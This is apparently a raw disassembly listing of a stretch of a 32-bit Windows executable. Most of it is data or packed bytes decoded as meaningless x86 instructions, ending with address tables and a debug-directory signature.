  4244a7:	out    dx,eax
  4244a8:	loop   0x42447f
  4244aa:	int3   
  4244ab:	jne    0x42451f
  4244ad:	push   edi
  4244ae:	pusha  
  4244af:	add    ecx,0xc4305d31
  4244b5:	ds xchg ebp,eax
  4244b7:	inc    ebp
  4244b8:	pop    ecx
  4244b9:	sbb    eax,0x7a749a59
  4244be:	retf   
  4244bf:	mov    WORD PTR [ebp-0x38],?
  4244c2:	(bad)  
  4244c3:	mov    ebp,0x9db900a1
  4244c8:	cmp    bl,BYTE PTR [ebp-0x44]
  4244cb:	push   ss
  4244cc:	fwait
  4244cd:	nop
  4244ce:	xchg   edx,eax
  4244cf:	jge    0x4244b8
  4244d1:	rcl    DWORD PTR [ecx+0x6f0e10b],1
  4244d7:	mov    BYTE PTR [edx],cl
  4244d9:	adc    esp,DWORD PTR [ebx+ecx*1+0x27]
  4244dd:	dec    eax
  4244de:	clc    
  4244df:	xor    dh,ah
  4244e1:	stos   DWORD PTR es:[edi],eax
  4244e2:	repz cdq 
  4244e4:	jbe    0x4244e0
  4244e6:	int3   
  4244e7:	pop    edi
  4244e8:	mov    ch,0xa1
  4244ea:	aad    0xa8
  4244ec:	sub    edx,esp
  4244ee:	pop    eax
  4244ef:	dec    esi
  4244f0:	jp     0x4244e2
  4244f2:	out    dx,al
  4244f3:	mov    ds,WORD PTR [ebp-0x6]
  4244f6:	jl     0x424540
  4244f8:	jns    0x424575
  4244fa:	ds mov ch,0xbd
  4244fd:	jge    0x424532
  4244ff:	xor    edi,DWORD PTR [edi+0x5ae7ac4a]
  424505:	cli    
  424506:	ficomp WORD PTR [esi]
  424508:	loopne 0x42453e
  42450a:	or     al,0xdd
  42450c:	jno    0x42452b
  42450e:	push   esi
  42450f:	fst    st(0)
  424511:	retf   0xf9ea
  424514:	sahf   
  424515:	cmp    bh,bh
  424517:	pop    ebx
  424518:	(bad)  
  424519:	jl     0x424584
  42451b:	jbe    0x4244bf
  42451d:	(bad)  
  42451e:	mov    ebx,0xa3448de3
  424523:	(bad)  
  424524:	sbb    BYTE PTR [esi-0x73],bh
  424527:	test   BYTE PTR ds:0xb25f2445,al
  42452d:	dec    eax
  42452e:	lea    esp,[eax]
  424530:	xor    dh,BYTE PTR [eax+0x47b74f84]
  424536:	jae    0x424555
  424538:	dec    ebx
  424539:	pop    ss
  42453a:	push   es
  42453b:	or     BYTE PTR [edx],0x69
  42453e:	adc    DWORD PTR [ecx-0x37],edx
  424541:	std    
  424542:	push   eax
  424543:	dec    esi
  424544:	mov    cl,0x73
  424546:	mov    ecx,0x4749cfd3
  42454b:	ins    DWORD PTR es:[edi],dx
  42454c:	test   al,0x9f
  42454e:	adc    DWORD PTR [ebx+ebp*1-0x41992f72],0xd836b2d2
  424559:	(bad)  
  42455a:	pushf  
  42455b:	jp     0x4245ab
  42455d:	or     BYTE PTR [ebx],ch
  42455f:	push   ebp
  424560:	or     DWORD PTR [eax-0x76],0x2e
  424564:	cmp    eax,0xacaa3bc5
  424569:	xor    eax,edx
  42456b:	fisub  DWORD PTR [eax+0x323eff92]
  424571:	pop    ebp
  424572:	das    
  424573:	out    dx,al
  424574:	pop    ebp
  424575:	out    dx,eax
  424576:	mov    WORD PTR [ebx-0x3ddaf3dc],?
  42457c:	mov    ds:0xc5ca2b34,al
  424581:	xchg   ebx,eax
  424582:	dec    esi
  424583:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424584:	mov    al,es:0x6c5fc347
  42458a:	xchg   edx,eax
  42458b:	nop
  42458c:	pop    es
  42458d:	push   edi
  42458e:	dec    ecx
  42458f:	ja     0x42456c
  424591:	adc    DWORD PTR [edx-0x2db1fc98],ebp
  424597:	aam    0xb6
  424599:	pop    edi
  42459a:	dec    esp
  42459b:	mov    ?,WORD PTR [ecx-0x19f7e328]
  4245a1:	push   ecx
  4245a2:	xchg   edi,eax
  4245a3:	cmp    eax,DWORD PTR [ebp+0x230e854e]
  4245a9:	lods   eax,DWORD PTR ds:[esi]
  4245aa:	push   cs
  4245ab:	or     al,dh
  4245ad:	jne    0x4245c2
  4245af:	mov    bl,BYTE PTR [ecx+edi*8]
  4245b2:	fdiv   DWORD PTR [ecx-0x3aba526d]
  4245b8:	jno    0x4245a0
  4245ba:	imul   DWORD PTR [edx-0x5573cc14]
  4245c0:	cmp    al,0x51
  4245c2:	mov    ecx,0x9f8065c3
  4245c7:	pop    ebx
  4245c8:	iret   
  4245c9:	xor    DWORD PTR [ebx-0x5bf32c73],ebx
  4245cf:	dec    ecx
  4245d0:	ja     0x424569
  4245d2:	lods   al,BYTE PTR ds:[esi]
  4245d3:	sbb    al,0x8a
  4245d5:	xor    eax,0x3d4a158
  4245da:	fisttp DWORD PTR [edx+0x58]
  4245dd:	pop    esi
  4245de:	stc    
  4245df:	cdq    
  4245e0:	xor    ah,al
  4245e2:	fdivr  QWORD PTR [edi]
  4245e4:	sti    
  4245e5:	dec    edi
  4245e6:	out    0x22,al
  4245e8:	ja     0x424579
  4245ea:	popa   
  4245eb:	or     eax,0x1e19c58b
  4245f0:	popf   
  4245f1:	add    cl,cl
  4245f3:	nop
  4245f4:	pop    ecx
  4245f5:	push   ds
  4245f6:	sbb    bl,ah
  4245f8:	xor    al,0x36
  4245fa:	xchg   ecx,eax
  4245fb:	xchg   ecx,eax
  4245fc:	(bad)  
  4245fd:	loopne 0x42459d
  4245ff:	psrld  mm4,QWORD PTR [eax*2-0x71f13dd2]
  424607:	jp     0x424639
  424609:	data16 sub dh,cl
  42460c:	xor    cl,BYTE PTR [ebx+eax*4+0x2e]
  424610:	jle    0x42459b
  424612:	nop
  424613:	scas   al,BYTE PTR es:[edi]
  424614:	stos   DWORD PTR es:[edi],eax
  424615:	dec    edi
  424616:	xchg   edi,eax
  424617:	inc    esp
  424618:	add    BYTE PTR [esi+0xf],al
  42461b:	cs jmp 0x147:0x2906379c
  424623:	sub    DWORD PTR [eax],0xdeb1479d
  424629:	xor    ecx,esp
  42462b:	pop    edx
  42462c:	imul   edx,DWORD PTR [esi],0x9d6c3cae
  424632:	je     0x424684
  424634:	sti    
  424635:	ins    BYTE PTR es:[edi],dx
  424636:	lock push ds
  424638:	sar    DWORD PTR [edi-0x9],1
  42463b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42463c:	xchg   esp,eax
  42463d:	jno    0x424603
  42463f:	push   es
  424640:	or     DWORD PTR ds:0xacc510ab,ebx
  424646:	xor    BYTE PTR [edx-0x65173bf0],ch
  42464c:	loope  0x424682
  42464e:	int    0x23
  424650:	shl    BYTE PTR [edx],0x1e
  424653:	jp     0x424614
  424655:	icebp  
  424656:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424657:	jecxz  0x424649
  424659:	int3   
  42465a:	dec    ebp
  42465b:	adc    cl,cl
  42465d:	pusha  
  42465e:	inc    ebx
  42465f:	pop    esp
  424660:	sbb    ah,BYTE PTR [ecx+0x2f]
  424663:	jl     0x424646
  424665:	sar    ecx,1
  424667:	jl     0x42466b
  424669:	push   0xe0cfff5b
  42466e:	inc    eax
  42466f:	in     al,0xd8
  424671:	inc    esi
  424672:	push   ecx
  424673:	push   edi
  424674:	or     eax,0x93bed027
  424679:	test   BYTE PTR [edx-0x21816a3],dh
  42467f:	add    al,0x14
  424681:	lahf   
  424682:	xor    DWORD PTR [edx-0x3247ba61],esp
  424688:	les    edx,FWORD PTR [edx-0x770d3bb4]
  42468e:	bnd jge 0x424663
  424691:	aad    0x2b
  424693:	or     ebp,DWORD PTR [ebp+0x6f]
  424696:	or     ch,bl
  424698:	cmp    ebp,DWORD PTR [edi]
  42469a:	data16 jnp 0x424668
  42469d:	fsubr  QWORD PTR [edx]
  42469f:	js     0x4246ac
  4246a1:	mov    eax,0x5bd37a1c
  4246a6:	mov    bh,0xe1
  4246a8:	out    0xc4,eax
  4246aa:	daa    
  4246ab:	in     eax,0x9
  4246ad:	ja     0x42472a
  4246af:	cwde   
  4246b0:	inc    edi
  4246b1:	xor    bh,BYTE PTR [ebp+0x27]
  4246b4:	push   ecx
  4246b5:	fisub  WORD PTR [esi]
  4246b7:	in     eax,0xd8
  4246b9:	call   0xd5b3fc7d
  4246be:	sbb    DWORD PTR [esi],esi
  4246c0:	shr    ebp,1
  4246c2:	mov    BYTE PTR ss:[edx+eax*4],ah
  4246c6:	mov    al,ds:0x4b19c1d4
  4246cb:	xchg   esp,eax
  4246cc:	mov    bl,0x4f
  4246ce:	mov    dl,0xd2
  4246d0:	cmp    DWORD PTR [eax-0xb03f968],eax
  4246d6:	mov    bh,0x24
  4246d8:	push   eax
  4246d9:	xor    al,dl
  4246db:	sbb    al,ah
  4246dd:	mov    DWORD PTR [esp+ecx*2-0x62],eax
  4246e1:	jbe    0x4246d2
  4246e3:	(bad)  
  4246e6:	add    ah,BYTE PTR [eax-0x4db7c2a]
  4246ec:	outs   dx,DWORD PTR ds:[esi]
  4246ed:	or     edx,DWORD PTR [ecx+0x7ef5797f]
  4246f3:	and    BYTE PTR [ecx+eiz*8-0x1d],al
  4246f7:	test   BYTE PTR [edi],0x47
  4246fa:	sub    edi,DWORD PTR [ebp-0x77]
  4246fd:	xor    DWORD PTR [ebx-0x7],edi
  424700:	and    DWORD PTR [edi+0x6555d876],0xffffffef
  424707:	mov    ebp,0x928bf7cc
  42470c:	stos   BYTE PTR es:[edi],al
  42470d:	out    dx,al
  42470e:	mov    ah,0x9a
  424710:	ret    
  424711:	mov    bl,0xba
  424713:	inc    ecx
  424714:	and    al,0xae
  424716:	in     eax,dx
  424717:	int3   
  424718:	ficomp DWORD PTR [esi+edi*8]
  42471b:	xor    ebx,ebp
  42471d:	mov    ds:0x15b6697,eax
  424722:	inc    esp
  424723:	call   0x35dba4fc
  424728:	and    DWORD PTR [ebp+0x0],ebx
  42472b:	sti    
  42472c:	mov    BYTE PTR [eax-0x7],ch
  42472f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424730:	mov    ebp,0xf6c59c1f
  424735:	dec    ecx
  424736:	adc    DWORD PTR [ebp+0x6c],ebx
  424739:	pop    ss
  42473a:	les    esi,FWORD PTR [eax-0x473e406d]
  424740:	inc    esp
  424741:	mov    eax,0x9efd2f39
  424746:	pop    esi
  424747:	lods   al,BYTE PTR ds:[esi]
  424748:	adc    edi,ebx
  42474a:	xor    DWORD PTR [esi-0x1dbe7f25],edx
  424750:	xor    al,0xc7
  424752:	mov    ch,0x41
  424754:	push   ebp
  424755:	xor    eax,0x9b5160b
  42475a:	sub    BYTE PTR [ebx+0x3a5aa26f],cl
  424760:	cdq    
  424761:	mov    ebx,0x72afbf4d
  424766:	mov    ecx,0xb5b51cbd
  42476b:	out    0x8d,al
  42476d:	mov    dl,0x3
  42476f:	and    DWORD PTR [esi],ecx
  424771:	adc    ebp,ebp
  424773:	push   ebp
  424774:	mov    bh,0x37
  424776:	add    al,0x67
  424778:	mov    ebp,0xb65001bd
  42477d:	mov    ds:0x66530278,eax
  424782:	repz inc eax
  424784:	jo     0x424758
  424786:	mov    edx,0xe2db7a2d
  42478b:	cmp    BYTE PTR [edi-0x66],ch
  42478e:	dec    ecx
  42478f:	or     dl,BYTE PTR [edi]
  424791:	push   ecx
  424792:	push   edi
  424793:	jl     0x424728
  424795:	bound  cx,DWORD PTR [ebx]
  424798:	aad    0x6c
  42479a:	mov    ecx,0x6ada8e76
  42479f:	sub    al,0xa5
  4247a1:	sbb    ebp,edi
  4247a3:	arpl   WORD PTR [esi-0x19c6bd4e],si
  4247a9:	jp     0x424771
  4247ab:	push   edi
  4247ac:	fcomp  QWORD PTR [eax+0xe]
  4247af:	xchg   ecx,eax
  4247b0:	popa   
  4247b1:	mov    bh,0xf5
  4247b3:	lds    esp,FWORD PTR [ebx]
  4247b5:	fs xor eax,0x718e5d6
  4247bb:	mov    BYTE PTR [ecx],dl
  4247bd:	clc    
  4247be:	sti    
  4247bf:	jns    0x424773
  4247c1:	adc    DWORD PTR [ecx-0x2a921f7f],edi
  4247c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4247c8:	mov    ebx,0x96108244
  4247cd:	xchg   BYTE PTR [ebp+0xc9b95ad],dl
  4247d3:	sbb    BYTE PTR [ebx+0x4f],0x6b
  4247d7:	xchg   ebp,eax
  4247d8:	jmp    0xcfd4:0x9701f939
  4247df:	out    0xf5,al
  4247e1:	push   ecx
  4247e2:	fucomp st(4)
  4247e4:	push   esp
  4247e5:	cwde   
  4247e6:	out    dx,al
  4247e7:	lock dec esi
  4247e9:	cmp    edx,0xffffff96
  4247ec:	mov    edi,0xdf24cf03
  4247f1:	ret    0x467
  4247f4:	les    esi,FWORD PTR [edi]
  4247f6:	rcr    al,0x6b
  4247f9:	push   esi
  4247fa:	fwait
  4247fb:	rcr    DWORD PTR [edx],cl
  4247fd:	in     eax,dx
  4247fe:	arpl   ax,ax
  424800:	mov    WORD PTR [eax],fs
  424802:	mov    dl,0xd8
  424804:	cld    
  424805:	mov    ebp,0xcc5a2792
  42480a:	sar    BYTE PTR [edx+0xe],1
  42480d:	jl     0x424821
  42480f:	dec    esp
  424810:	(bad)  
  424811:	fld    QWORD PTR [ebx+edi*4]
  424814:	ret    
  424815:	popf   
  424816:	mul    BYTE PTR [edi-0x4ac70df2]
  42481c:	inc    edi
  42481d:	fsubr  DWORD PTR [edx+0x36]
  424820:	mov    ebx,0x52109fd1
  424825:	jnp    0x42481d
  424827:	add    esi,DWORD PTR [eax+0x4b]
  42482a:	cmp    esi,DWORD PTR [ecx+eax*4+0x1f]
  42482e:	fdivr  DWORD PTR [eax*1-0x1d7348cd]
  424835:	adc    BYTE PTR [ecx+0x26ea7bf],0xea
  42483c:	daa    
  42483d:	sub    al,0x66
  42483f:	scas   eax,DWORD PTR es:[edi]
  424840:	cmp    al,0xbe
  424842:	in     eax,dx
  424843:	xor    DWORD PTR [esi-0x5e7789b],0x94a2f5e8
  42484d:	pop    ds
  42484e:	and    al,0xdd
  424850:	fisttp DWORD PTR [eax+0x67f65b60]
  424856:	cli    
  424857:	outs   dx,BYTE PTR ds:[esi]
  424858:	into   
  424859:	mov    edx,?
  42485b:	loop   0x424856
  42485d:	pop    ecx
  42485e:	dec    edx
  42485f:	or     edx,ebp
  424861:	cli    
  424862:	fdivrp st(6),st
  424864:	jae    0x424873
  424866:	mov    dl,0x81
  424868:	cmp    DWORD PTR [edi],0x32
  42486b:	adc    dl,BYTE PTR [esi-0x41d0c5c0]
  424871:	dec    eax
  424872:	mov    edx,0xb2079e4c
  424877:	lods   al,BYTE PTR ds:[esi]
  424878:	push   ss
  424879:	cwde   
  42487a:	les    ebp,FWORD PTR [eax+0x2fe19b0b]
  424880:	push   ecx
  424881:	mov    ds:0x94844192,al
  424886:	cld    
  424887:	aaa    
  424888:	int3   
  424889:	scas   eax,DWORD PTR es:[edi]
  42488a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42488b:	mov    ah,0xa4
  42488d:	and    ecx,DWORD PTR [esi-0x5367d14d]
  424893:	daa    
  424894:	hlt    
  424895:	pop    edx
  424896:	add    eax,0x2edae8be
  42489b:	mov    BYTE PTR [edx-0x25],bl
  42489e:	(bad)  
  42489f:	arpl   WORD PTR [eax+0x32],sp
  4248a2:	push   ecx
  4248a3:	lods   eax,DWORD PTR ds:[esi]
  4248a4:	adc    al,0x59
  4248a6:	or     al,0x5f
  4248a8:	sub    BYTE PTR [esi+ebp*2-0x75],ch
  4248ac:	inc    ecx
  4248ad:	pop    edx
  4248ae:	push   edx
  4248af:	mov    ebx,0x86073d8d
  4248b4:	pusha  
  4248b5:	(bad)  
  4248b6:	and    dl,BYTE PTR [ebx]
  4248b8:	sbb    eax,eax
  4248ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4248bb:	sbb    eax,0xc782b6e2
  4248c0:	mov    ecx,0x68ce50dd
  4248c5:	xlat   BYTE PTR ds:[ebx]
  4248c6:	xchg   BYTE PTR [ebp+0x45],dl
  4248c9:	data16 mov dl,0x20
  4248cc:	xchg   ebp,eax
  4248cd:	mov    WORD PTR [edi-0x3c],ss
  4248d0:	stos   BYTE PTR es:[edi],al
  4248d1:	sbb    ebx,DWORD PTR [edi+esi*1]
  4248d4:	loope  0x42494e
  4248d6:	push   ecx
  4248d7:	push   ds
  4248d8:	sub    al,0xd3
  4248da:	fsubr  QWORD PTR [edx-0x72]
  4248dd:	mov    cl,0xc7
  4248df:	repnz dec ebp
  4248e1:	(bad)  
  4248e2:	outs   dx,BYTE PTR ds:[esi]
  4248e3:	test   bl,0x30
  4248e6:	jge    0x4248dd
  4248e8:	mov    bl,0x81
  4248ea:	push   ss
  4248eb:	dec    ecx
  4248ec:	in     eax,dx
  4248ed:	test   al,0x8e
  4248ef:	dec    ecx
  4248f0:	leave  
  4248f1:	mov    edx,0x2a192192
  4248f6:	and    al,0x81
  4248f8:	fisubr WORD PTR [edx+0x15]
  4248fb:	add    bl,BYTE PTR [eax]
  4248fd:	pop    ss
  4248fe:	jl     0x4248c8
  424900:	pop    es
  424901:	mov    edx,0x91f3fdb3
  424906:	inc    DWORD PTR [esi-0x7e]
  424909:	shr    BYTE PTR [ebx+ebp*4],1
  42490c:	cmp    BYTE PTR [edx-0x754d58cc],cl
  424912:	aad    0x5c
  424914:	push   es
  424915:	(bad)
  424919:	pop    ds
  42491a:	je     0x424976
  42491c:	or     eax,0x7951a248
  424921:	push   cs
  424922:	push   cs
  424923:	and    dl,BYTE PTR [esi+0x304f568e]
  424929:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42492a:	rcl    DWORD PTR [eax+0x4748638e],cl
  424930:	repz (bad) 
  424932:	mov    ds:0x98997de0,eax
  424937:	push   es
  424938:	cmp    dh,BYTE PTR [eax-0x72]
  42493b:	iret   
  42493c:	xor    eax,0x32b9a671
  424941:	sbb    BYTE PTR [esi+0x7fdaf191],al
  424947:	fld    st(2)
  424949:	jne    0x424905
  42494b:	in     al,0xfb
  42494d:	hlt    
  42494e:	mov    bl,0xd5
  424950:	xor    edi,ebp
  424952:	ret    0x53df
  424955:	mov    esi,0xff4df18c
  42495a:	jne    0x42498b
  42495c:	icebp  
  42495d:	push   ss
  42495e:	pop    edx
  42495f:	test   al,0xb3
  424961:	xor    BYTE PTR [esi-0x48],0x61
  424965:	push   es
  424966:	out    dx,eax
  424967:	adc    bl,BYTE PTR [ebx+0x7616e16]
  42496d:	mov    bl,bh
  42496f:	imul   eax,DWORD PTR [esi],0x6e244dd9
  424975:	hlt    
  424976:	push   ds
  424977:	std    
  424978:	mov    ebp,0x43234aad
  42497d:	xchg   esp,eax
  42497e:	mov    esi,0xf61723e0
  424983:	mov    DWORD PTR [ebx-0x29],edx
  424986:	adc    edi,edi
  424988:	add    al,0x69
  42498a:	adc    dh,dl
  42498c:	push   ecx
  42498d:	sub    al,0x85
  42498f:	add    dh,0x9b
  424992:	mov    BYTE PTR [ebx+0x1b4dffa0],0x54
  424999:	cmp    al,BYTE PTR [ebx+ebp*1-0x31]
  42499d:	cmp    eax,0x928c1186
  4249a2:	xchg   edx,eax
  4249a3:	in     al,0xe1
  4249a5:	cmp    esi,edi
  4249a7:	push   cs
  4249a8:	rcr    al,0x9a
  4249ab:	mov    edi,0xa566b6a4
  4249b0:	sub    eax,0xf9016201
  4249b5:	lods   eax,DWORD PTR ds:[esi]
  4249b6:	fimul  DWORD PTR [edx+0x3e]
  4249b9:	fimul  WORD PTR [esi+0x612a0eec]
  4249bf:	fisubr DWORD PTR [edi+0x1c16296b]
  4249c5:	xor    esp,0x83da92a6
  4249cb:	dec    eax
  4249cc:	aam    0xa9
  4249ce:	loop   0x4249a3
  4249d0:	fst    QWORD PTR [edi-0x7fc0faf2]
  4249d6:	sub    al,0x59
  4249d8:	sub    DWORD PTR [edi+0x7f4f12c0],0xcc9e42f5
  4249e2:	(bad)  
  4249e3:	mov    al,0x1f
  4249e5:	and    eax,edx
  4249e7:	mov    ecx,0x66f4e696
  4249ec:	sbb    dl,BYTE PTR fs:[ebx]
  4249ef:	cli    
  4249f0:	adc    dl,BYTE PTR ss:[ecx]
  4249f3:	xchg   BYTE PTR [esi+0x4b],al
  4249f6:	mov    ah,0x2b
  4249f8:	jnp    0x4249d0
  4249fa:	xor    bh,dh
  4249fc:	xor    DWORD PTR [edx],0x20
  4249ff:	repnz daa 
  424a01:	cmp    al,ah
  424a03:	add    dl,BYTE PTR [esi]
  424a05:	sti    
  424a06:	pop    ds
  424a07:	daa    
  424a08:	fstp   TBYTE PTR [edi+0x2c]
  424a0b:	cmp    esp,DWORD PTR [edi+esi*8]
  424a0e:	push   ecx
  424a0f:	or     ch,ch
  424a11:	xchg   DWORD PTR [esi-0x11f8bb82],ebp
  424a17:	inc    eax
  424a18:	cmp    BYTE PTR [eax-0x22],0x59
  424a1c:	xor    BYTE PTR [edx+eiz*2],dh
  424a1f:	repnz pop ecx
  424a21:	fisubr DWORD PTR [ebx-0x46ab33d7]
  424a27:	sbb    ch,BYTE PTR [eax+eax*2]
  424a2a:	fnstcw WORD PTR [edx-0x3a]
  424a2d:	and    eax,0xf53e7e67
  424a32:	outs   dx,DWORD PTR ds:[esi]
  424a33:	icebp  
  424a34:	pop    es
  424a35:	push   edi
  424a36:	scas   al,BYTE PTR es:[edi]
  424a37:	fs sti 
  424a39:	repz pop edi
  424a3b:	sub    esi,DWORD PTR ds:0xd996312d
  424a41:	aaa    
  424a42:	pusha  
  424a43:	arpl   WORD PTR [ebx+0x75],sp
  424a46:	mov    fs,WORD PTR [esi]
  424a48:	mov    ecx,0x9f6dd51e
  424a4d:	imul   ebp,DWORD PTR [ebx],0xffffff8f
  424a50:	mov    cs,WORD PTR ds:0x6ced397b
  424a56:	inc    edx
  424a57:	ret    
  424a58:	mov    bl,0xf3
  424a5a:	mov    ds:0x6b2cd116,al
  424a5f:	lahf   
  424a60:	mov    ch,0xae
  424a62:	cmp    eax,0x4e4bb8dd
  424a67:	pop    DWORD PTR [edi+0x7d]
  424a6a:	dec    esp
  424a6b:	fwait
  424a6c:	in     al,dx
  424a6d:	xor    eax,DWORD PTR [ebx+0x445764ec]
  424a73:	leave  
  424a74:	test   DWORD PTR [ebx+0x47],esp
  424a77:	or     DWORD PTR [edx],ebp
  424a79:	dec    esp
  424a7a:	cmp    eax,0xbb02f186
  424a7f:	mov    cl,0x9d
  424a81:	push   0xbc46296f
  424a86:	icebp  
  424a87:	lahf   
  424a88:	add    ecx,DWORD PTR [eax]
  424a8a:	dec    esi
  424a8b:	mov    edx,0x10b9a313
  424a90:	push   eax
  424a91:	cli    
  424a92:	sbb    edi,DWORD PTR [ecx+ebx*1+0x6a236f1c]
  424a99:	push   ds
  424a9a:	jmp    0xbc5dc927
  424a9f:	out    0x4e,al
  424aa1:	mov    ebp,0x85490ba8
  424aa6:	sbb    DWORD PTR [eax],edi
  424aa8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424aa9:	scas   eax,DWORD PTR es:[edi]
  424aaa:	push   esp
  424aab:	push   0x11
  424aad:	test   eax,0xb49aa0c5
  424ab2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424ab3:	inc    edx
  424ab4:	mov    al,ds:0xc8d35b5f
  424ab9:	and    bl,cl
  424abb:	popf   
  424abc:	cmp    BYTE PTR [edx+0x72663145],dh
  424ac2:	or     ecx,edi
  424ac4:	imul   esi,DWORD PTR ds:[ecx-0x43],0x5
  424ac9:	jp     0x424adf
  424acb:	inc    ebx
  424acc:	lock loopne 0x424a5c
  424acf:	add    ebx,DWORD PTR [eax-0x6991a140]
  424ad5:	sbb    edi,0x19740d37
  424adb:	fwait
  424adc:	or     ebx,DWORD PTR [ebp+0x6f]
  424adf:	pop    esi
  424ae0:	pop    ebx
  424ae1:	leave  
  424ae2:	ret    0xc
  424ae5:	add    BYTE PTR [eax-0x5ffbffbe],ah
  424aeb:	inc    edx
  424aec:	add    BYTE PTR [eax],cl
  424aee:	mov    al,ds:0xa00c0042
  424af3:	inc    edx
  424af4:	add    BYTE PTR [eax],dl
  424af6:	mov    al,ds:0xa0140042
  424afb:	inc    edx
  424afc:	add    BYTE PTR [eax],bl
  424afe:	mov    al,ds:0xa01c0042
  424b03:	inc    edx
  424b04:	add    BYTE PTR [eax],al
  424b06:	rol    BYTE PTR [edx+0x0],1
  424b09:	add    al,0xd0
  424b0b:	inc    edx
  424b0c:	add    BYTE PTR [eax],cl
  424b0e:	rol    BYTE PTR [edx+0x0],1
  424b11:	or     al,0xd0
  424b13:	inc    edx
  424b14:	add    BYTE PTR [eax],dl
  424b16:	rol    BYTE PTR [edx+0x0],1
  424b19:	adc    al,0xd0
  424b1b:	inc    edx
  424b1c:	add    BYTE PTR [eax],bl
  424b1e:	rol    BYTE PTR [edx+0x0],1
  424b21:	sbb    al,0xd0
  424b23:	inc    edx
	...
  424b34:	sbb    dh,ah
  424b36:	xlat   BYTE PTR ds:[ebx]
  424b37:	dec    ebp
  424b38:	add    BYTE PTR [eax],al
  424b3a:	add    BYTE PTR [eax],al
  424b3c:	add    al,BYTE PTR [eax]
  424b3e:	add    BYTE PTR [eax],al
  424b40:	cmp    eax,0x30000000
  424b45:	dec    esp
  424b46:	add    al,BYTE PTR [eax]
  424b48:	xor    BYTE PTR [eax+0x2],al
	...
  424b53:	add    BYTE PTR [edx],bl
  424b55:	hlt    
  424b56:	xlat   BYTE PTR ds:[ebx]
  424b57:	dec    ebp
  424b58:	add    BYTE PTR [eax],al
  424b5a:	add    BYTE PTR [eax],al
  424b5c:	or     BYTE PTR [ebx+0x2],0x0
  424b60:	add    DWORD PTR [eax],eax
  424b62:	add    BYTE PTR [eax],al
  424b64:	add    DWORD PTR [eax],eax
  424b66:	add    BYTE PTR [eax],al
  424b68:	add    DWORD PTR [eax],eax
  424b6a:	add    BYTE PTR [eax],al
  424b6c:	js     0x424bb9
  424b6e:	add    al,BYTE PTR [eax]
  424b70:	jl     0x424bbd
  424b72:	add    al,BYTE PTR [eax]
  424b74:	or     BYTE PTR [ebx+0x2],0x0
  424b78:	xor    eax,0x8e00002a
  424b7d:	dec    ebx
  424b7e:	add    al,BYTE PTR [eax]
  424b80:	add    BYTE PTR [eax],al
  424b82:	inc    esp
  424b83:	jns    0x424bf3
  424b85:	popa   
  424b86:	ins    DWORD PTR es:[edi],dx
  424b87:	imul   ebp,DWORD PTR [ecx+0x43],0x747361
  424b8e:	aas    
  424b8f:	inc    edi
  424b90:	gs je  0x424be8
  424b93:	jae    0x424bfa
  424b95:	jb     0x424be6
  424b97:	bound  ebp,QWORD PTR [edx+0x65]
  424b9a:	arpl   WORD PTR [ebx+edx*2+0x65],si
  424b9e:	arpl   WORD PTR [ebp+0x72],si
  424ba1:	imul   esi,DWORD PTR [ecx+edi*2+0x47],0x73557465
  424ba9:	gs jb  0x424bfb
  424bac:	bound  ebp,QWORD PTR [edx+0x65]
  424baf:	arpl   WORD PTR [ebx+edx*2+0x65],si
  424bb3:	arpl   WORD PTR [ebp+0x0],si
  424bb6:	nop
  424bb7:	inc    edx
  424bb8:	add    BYTE PTR [eax+edx*4],al
  424bbb:	inc    edx
  424bbc:	add    BYTE PTR [eax],cl
  424bbe:	nop
  424bbf:	inc    edx
  424bc0:	add    BYTE PTR [eax+edx*4],cl
  424bc3:	inc    edx
  424bc4:	add    BYTE PTR [eax],dl
  424bc6:	nop
  424bc7:	inc    edx
  424bc8:	add    BYTE PTR [eax+edx*4],dl
  424bcb:	inc    edx
  424bcc:	add    BYTE PTR [eax],bl
  424bce:	nop
  424bcf:	inc    edx
  424bd0:	add    BYTE PTR [eax+edx*4],bl
  424bd3:	inc    edx
  424bd4:	add    BYTE PTR [eax],ah
  424bd6:	nop
  424bd7:	inc    edx
  424bd8:	add    BYTE PTR [eax+edx*4],ah
  424bdb:	inc    edx
  424bdc:	add    BYTE PTR [eax],ch
  424bde:	nop
  424bdf:	inc    edx
  424be0:	add    BYTE PTR [eax],al
  424be2:	mov    al,0x42
  424be4:	add    BYTE PTR [eax+esi*4],al
  424be7:	inc    edx
  424be8:	add    BYTE PTR [eax],cl
  424bea:	mov    al,0x42
  424bec:	add    BYTE PTR [eax+esi*4],cl
  424bef:	inc    edx
  424bf0:	add    BYTE PTR [eax],dl
  424bf2:	mov    al,0x42
  424bf4:	add    BYTE PTR [eax+esi*4],dl
  424bf7:	inc    edx
  424bf8:	add    BYTE PTR [eax],bl
  424bfa:	mov    al,0x42
  424bfc:	add    BYTE PTR [eax+esi*4],bl
  424bff:	inc    edx
  424c00:	add    BYTE PTR [eax],al
  424c02:	rol    BYTE PTR [edx+0x0],0x4
  424c06:	rol    BYTE PTR [edx+0x0],0x8
  424c0a:	rol    BYTE PTR [edx+0x0],0xc
  424c0e:	rol    BYTE PTR [edx+0x0],0x10
  424c12:	rol    BYTE PTR [edx+0x0],0x14
  424c16:	rol    BYTE PTR [edx+0x0],0x18
  424c1a:	rol    BYTE PTR [edx+0x0],0x1c
  424c1e:	rol    BYTE PTR [edx+0x0],0x0
	...
  424c2e:	add    BYTE PTR [eax],al
  424c30:	push   edx
  424c31:	push   ebx
  424c32:	inc    esp
  424c33:	push   ebx
  424c34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424c35:	imul   ebx,esi,0x169536e2
  424c3b:	inc    ebx
  424c3c:	scas   al,BYTE PTR es:[edi]
  424c3d:	add    ebx,edx
  424c3f:	clc    
  424c40:	push   cs
  424c41:	lods   eax,DWORD PTR ds:[esi]
  424c42:	stos   DWORD PTR es:[edi],eax
  424c43:	in     al,0x1
  424c45:	add    BYTE PTR [eax],al
  424c47:	add    BYTE PTR [ebx+0x3a],al
  424c4a:	pop    esp
  424c4b:	inc    ebx
